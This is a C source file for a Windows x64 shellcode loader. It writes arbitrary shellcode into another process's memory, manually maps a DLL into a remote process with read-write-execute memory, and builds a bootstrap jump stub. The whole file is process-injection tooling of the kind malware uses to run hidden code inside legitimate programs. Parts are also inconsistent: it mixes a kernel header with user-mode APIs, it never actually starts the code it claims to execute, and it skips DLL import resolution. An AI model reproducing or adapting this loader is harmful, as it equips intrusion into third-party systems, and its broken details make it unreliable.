/*
 * Shellcode Loader
 *
 * Prepares and executes shellcode in target process with proper
 * environment setup and exception handling.
 *
 * Target: Windows 10/11 x64
 */

#include "ShellcodeLoader.h"
#include "TypeDefinitions.h"
#include "Constants.h"
#include <ntifs.h>

NTSTATUS InitializeShellcodeLoader(
    OUT PSHELLCODE_LOADER_CONTEXT Context,
    IN HANDLE TargetProcess
)
{
    if (Context == NULL || TargetProcess == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    RtlZeroMemory(Context, sizeof(SHELLCODE_LOADER_CONTEXT));
    Context->Tag = SHELLCODE_LOADER_TAG;
    Context->TargetProcess = TargetProcess;
    Context->LoaderFlags = SHELLCODE_FLAG_ALLOCATE_RWX;

    return STATUS_SUCCESS;
}

NTSTATUS PrepareShellcode(
    IN PSHELLCODE_LOADER_CONTEXT Context,
    IN PVOID Shellcode,
    IN SIZE_T ShellcodeSize,
    OUT PSHELLCODE_ENTRY Entry
)
{
    PVOID RemoteBuffer;
    SIZE_T BytesWritten;
    DWORD OldProtect;

    if (Context == NULL || Shellcode == NULL || ShellcodeSize == 0 || Entry == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    RtlZeroMemory(Entry, sizeof(SHELLCODE_ENTRY));

    // Allocate memory in target process
    RemoteBuffer = VirtualAllocEx(
        Context->TargetProcess,
        NULL,
        ShellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (RemoteBuffer == NULL) {
        return STATUS_NO_MEMORY;
    }

    // Write shellcode
    if (!WriteProcessMemory(
        Context->TargetProcess,
        RemoteBuffer,
        Shellcode,
        ShellcodeSize,
        &BytesWritten
    )) {
        VirtualFreeEx(Context->TargetProcess, RemoteBuffer, 0, MEM_RELEASE);
        return STATUS_UNSUCCESSFUL;
    }

    // Change to executable
    if (!VirtualProtectEx(
        Context->TargetProcess,
        RemoteBuffer,
        ShellcodeSize,
        PAGE_EXECUTE_READ,
        &OldProtect
    )) {
        VirtualFreeEx(Context->TargetProcess, RemoteBuffer, 0, MEM_RELEASE);
        return STATUS_UNSUCCESSFUL;
    }

    // Fill entry
    Entry->ShellcodeAddress = RemoteBuffer;
    Entry->ShellcodeSize = ShellcodeSize;
    Entry->EntryPoint = RemoteBuffer;
    Entry->Flags = SHELLCODE_FLAG_ALLOCATED | SHELLCODE_FLAG_EXECUTABLE;

    Context->LoadedShellcodeCount++;

    return STATUS_SUCCESS;
}

NTSTATUS LoadDllShellcode(
    IN PSHELLCODE_LOADER_CONTEXT Context,
    IN PVOID DllBuffer,
    IN SIZE_T DllSize,
    OUT PSHELLCODE_ENTRY Entry
)
{
    NTSTATUS Status;
    PIMAGE_DOS_HEADER DosHeader;
    PIMAGE_NT_HEADERS NtHeaders;
    PVOID RemoteImage;
    PVOID LocalImage;
    SIZE_T ImageSize;

    if (Context == NULL || DllBuffer == NULL || DllSize == 0 || Entry == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Parse PE headers
    DosHeader = (PIMAGE_DOS_HEADER)DllBuffer;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    NtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)DllBuffer + DosHeader->e_lfanew);
    if (NtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    ImageSize = NtHeaders->OptionalHeader.SizeOfImage;

    // Allocate local buffer for mapping
    LocalImage = VirtualAlloc(NULL, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (LocalImage == NULL) {
        return STATUS_NO_MEMORY;
    }

    // Copy headers
    RtlCopyMemory(LocalImage, DllBuffer, NtHeaders->OptionalHeader.SizeOfHeaders);

    // Copy sections
    PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);
    for (USHORT i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
        if (Section[i].SizeOfRawData > 0) {
            RtlCopyMemory(
                (PUCHAR)LocalImage + Section[i].VirtualAddress,
                (PUCHAR)DllBuffer + Section[i].PointerToRawData,
                Section[i].SizeOfRawData
            );
        }
    }

    // Allocate in target process
    RemoteImage = VirtualAllocEx(
        Context->TargetProcess,
        NULL,
        ImageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (RemoteImage == NULL) {
        VirtualFree(LocalImage, 0, MEM_RELEASE);
        return STATUS_NO_MEMORY;
    }

    // Process relocations
    Status = ProcessRelocationsForShellcode(
        LocalImage,
        NtHeaders,
        (ULONGLONG)RemoteImage
    );

    if (!NT_SUCCESS(Status)) {
        VirtualFreeEx(Context->TargetProcess, RemoteImage, 0, MEM_RELEASE);
        VirtualFree(LocalImage, 0, MEM_RELEASE);
        return Status;
    }

    // Write mapped image to target
    SIZE_T BytesWritten;
    if (!WriteProcessMemory(
        Context->TargetProcess,
        RemoteImage,
        LocalImage,
        ImageSize,
        &BytesWritten
    )) {
        VirtualFreeEx(Context->TargetProcess, RemoteImage, 0, MEM_RELEASE);
        VirtualFree(LocalImage, 0, MEM_RELEASE);
        return STATUS_UNSUCCESSFUL;
    }

    VirtualFree(LocalImage, 0, MEM_RELEASE);

    // Fill entry
    RtlZeroMemory(Entry, sizeof(SHELLCODE_ENTRY));
    Entry->ShellcodeAddress = RemoteImage;
    Entry->ShellcodeSize = ImageSize;
    Entry->EntryPoint = (PVOID)((PUCHAR)RemoteImage + NtHeaders->OptionalHeader.AddressOfEntryPoint);
    Entry->Flags = SHELLCODE_FLAG_ALLOCATED | SHELLCODE_FLAG_EXECUTABLE | SHELLCODE_FLAG_PE_IMAGE;

    Context->LoadedShellcodeCount++;

    return STATUS_SUCCESS;
}

NTSTATUS ProcessRelocationsForShellcode(
    IN PVOID ImageBase,
    IN PIMAGE_NT_HEADERS NtHeaders,
    IN ULONGLONG NewBase
)
{
    PIMAGE_DATA_DIRECTORY RelocDir;
    PIMAGE_BASE_RELOCATION Reloc;
    ULONGLONG Delta;
    ULONG RelocSize;

    RelocDir = &NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (RelocDir->Size == 0) {
        return STATUS_SUCCESS;
    }

    Delta = NewBase - NtHeaders->OptionalHeader.ImageBase;
    if (Delta == 0) {
        return STATUS_SUCCESS;
    }

    Reloc = (PIMAGE_BASE_RELOCATION)((PUCHAR)ImageBase + RelocDir->VirtualAddress);
    RelocSize = RelocDir->Size;

    while (RelocSize > 0 && Reloc->SizeOfBlock > 0) {
        ULONG EntryCount = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        PUSHORT Entries = (PUSHORT)((PUCHAR)Reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (ULONG i = 0; i < EntryCount; i++) {
            USHORT Type = Entries[i] >> 12;
            USHORT Offset = Entries[i] & 0xFFF;
            PVOID Target = (PUCHAR)ImageBase + Reloc->VirtualAddress + Offset;

            switch (Type) {
                case IMAGE_REL_BASED_DIR64:
                    *(PULONGLONG)Target += Delta;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(PULONG)Target += (ULONG)Delta;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *(PUSHORT)Target += HIWORD(Delta);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *(PUSHORT)Target += LOWORD(Delta);
                    break;
            }
        }

        RelocSize -= Reloc->SizeOfBlock;
        Reloc = (PIMAGE_BASE_RELOCATION)((PUCHAR)Reloc + Reloc->SizeOfBlock);
    }

    return STATUS_SUCCESS;
}

NTSTATUS CreateBootstrapShellcode(
    IN PSHELLCODE_LOADER_CONTEXT Context,
    IN PVOID TargetFunction,
    IN PVOID Parameter,
    OUT PVOID* BootstrapCode,
    OUT PSIZE_T BootstrapSize
)
{
    // x64 bootstrap shellcode template
    // mov rcx, parameter
    // mov rax, target_function
    // jmp rax

    UCHAR Template[] = {
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rcx, parameter
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, target
        0xFF, 0xE0                                                    // jmp rax
    };

    PVOID Bootstrap = VirtualAlloc(NULL, sizeof(Template), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (Bootstrap == NULL) {
        return STATUS_NO_MEMORY;
    }

    RtlCopyMemory(Bootstrap, Template, sizeof(Template));

    // Patch parameter
    *(PULONGLONG)((PUCHAR)Bootstrap + 2) = (ULONGLONG)Parameter;

    // Patch target function
    *(PULONGLONG)((PUCHAR)Bootstrap + 12) = (ULONGLONG)TargetFunction;

    *BootstrapCode = Bootstrap;
    *BootstrapSize = sizeof(Template);

    return STATUS_SUCCESS;
}

NTSTATUS UnloadShellcode(
    IN PSHELLCODE_LOADER_CONTEXT Context,
    IN PSHELLCODE_ENTRY Entry
)
{
    if (Context == NULL || Entry == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    if (Entry->Flags & SHELLCODE_FLAG_ALLOCATED) {
        if (!VirtualFreeEx(
            Context->TargetProcess,
            Entry->ShellcodeAddress,
            0,
            MEM_RELEASE
        )) {
            return STATUS_UNSUCCESSFUL;
        }

        Entry->Flags &= ~SHELLCODE_FLAG_ALLOCATED;
        Context->LoadedShellcodeCount--;
    }

    RtlZeroMemory(Entry, sizeof(SHELLCODE_ENTRY));

    return STATUS_SUCCESS;
}

VOID CleanupShellcodeLoader(IN PSHELLCODE_LOADER_CONTEXT Context)
{
    if (Context != NULL) {
        RtlZeroMemory(Context, sizeof(SHELLCODE_LOADER_CONTEXT));
    }
}
